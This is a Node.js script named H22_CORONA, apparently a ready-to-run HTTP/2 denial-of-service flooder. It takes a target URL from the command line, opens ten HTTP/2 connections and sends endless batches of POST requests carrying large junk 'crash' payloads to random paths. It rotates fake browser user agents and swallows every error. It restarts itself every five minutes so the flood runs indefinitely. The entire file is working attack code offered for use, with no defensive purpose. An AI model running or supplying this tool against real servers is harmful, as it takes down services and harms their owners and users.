const http2 = require('http2');
const { URL } = require('url');

class H22_CORONA {
    constructor(target) {
        const url = new URL(target);
        this.hostname = url.hostname;
        this.target = target;
        
        this.running = true;
        this.totalReqs = 0;
        this.lastLog = Date.now();
        this.lastStatus = 200;
        
        // CRASH payloads
        this.CRASH_PAYLOADS = [
            Buffer.alloc(65535, 'A'),
            Buffer.alloc(8192, 'X'),
            Buffer.alloc(16384, 'Z'.repeat(16384)),
            Buffer.from(Array.from({length: 10000}, () => Math.floor(Math.random() * 256))),
            Buffer.alloc(50000, '\x00')
        ];
        
        // Color codes
        this.colors = {
            reset: '\x1b[0m',
            darkMagenta: '\x1b[35m',
            darkGreen: '\x1b[32m',
            red: '\x1b[91m',
            green: '\x1b[92m',
            yellow: '\x1b[93m'
        };
        
        // Create 10x HTTP/2 connections
        this.connections = this.createConnections(10);
        
        // Start attack cycle with restart logic
        this.startAttack();
    }

    createConnections(count) {
        const connections = [];
        for (let i = 0; i < count; i++) {
            try {
                const client = http2.connect(this.target, {
                    maxSessionMemory: 2048 * 2048,
                    maxDeflateDynamicTableSize: 8192,
                    maxSendHeaderBlockLength: 65536
                });
                
                client.on('error', () => {});
                connections.push(client);
            } catch (err) {}
        }
        return connections.filter(Boolean);
    }

    startAttack() {
        const attackCycle = () => {
            if (!this.running) return;
            
            try {
                // Send CRASH payloads through each connection
                for (const client of this.connections) {
                    if (client && !client.destroyed) {
                        // Send 150 requests per connection per batch
                        for (let i = 0; i < 150; i++) {
                            this.sendCRASHRequest(client);
                            this.totalReqs++;
                        }
                    }
                }
                
                // Log every 10 seconds
                const now = Date.now();
                if (now - this.lastLog >= 10000) {
                    this.lastLog = now;
                    this.logStatus();
                    
                    // Force garbage collection attempt
                    if (global.gc) global.gc();
                }
                
                // Immediate next batch
                setImmediate(attackCycle);
            } catch (error) {
                // Restart on any failure
                setTimeout(() => {
                    this.restartConnections();
                    attackCycle();
                }, 100);
            }
        };
        
        attackCycle();
    }

    sendCRASHRequest(client) {
        try {
            const payload = this.CRASH_PAYLOADS[Math.floor(Math.random() * this.CRASH_PAYLOADS.length)];
            const req = client.request({
                ':method': 'POST',
                ':path': '/' + Math.random().toString(36).substring(7),
                ':authority': this.hostname,
                'content-length': payload.length,
                'user-agent': this.getRandomUA()
            });
            
            req.write(payload);
            
            req.on('response', (headers) => {
                this.lastStatus = headers[':status'] || 200;
            });
            
            req.on('error', () => {
                this.lastStatus = '*.*';
            });
            
            req.end();
        } catch (err) {
            this.lastStatus = '*.*';
        }
    }

    getRandomUA() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    restartConnections() {
        for (const client of this.connections) {
            try {
                if (client && !client.destroyed) client.destroy();
            } catch (e) {}
        }
        this.connections = this.createConnections(10);
    }

    logStatus() {
        const prefix = `${this.colors.darkMagenta}H22_CORONA${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
        
        let statusColor = this.colors.green;
        let statusText = this.lastStatus;
        
        if (statusText === '*.*') statusColor = this.colors.red;
        else if (typeof statusText === 'number') {
            if (statusText >= 500) statusColor = this.colors.red;
            else if (statusText >= 400) statusColor = this.colors.red;
            else if (statusText >= 300) statusColor = this.colors.yellow;
            else if (statusText >= 200) statusColor = this.colors.green;
        }
        
        console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
    }

    stop() {
        this.running = false;
        for (const client of this.connections) {
            try {
                if (client && !client.destroyed) client.destroy();
            } catch (e) {}
        }
    }
}

// Run forever with restart
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    require('v8').setFlagsFromString('--max-old-space-size=8192');
    
    if (process.argv.length < 3) {
        console.log('Usage: node H22_CORONA.js https://target.com');
        process.exit(1);
    }
    
    const target = process.argv[2];
    
    const runForever = () => {
        const corona = new H22_CORONA(target);
        
        // Auto-restart every 5 minutes
        setTimeout(() => {
            corona.stop();
            setTimeout(runForever, 1000);
        }, 300000);
    };
    
    runForever();
    
    process.on('SIGINT', () => {
        console.log('\nH22_CORONA stopped.');
        process.exit(0);
    });
            }
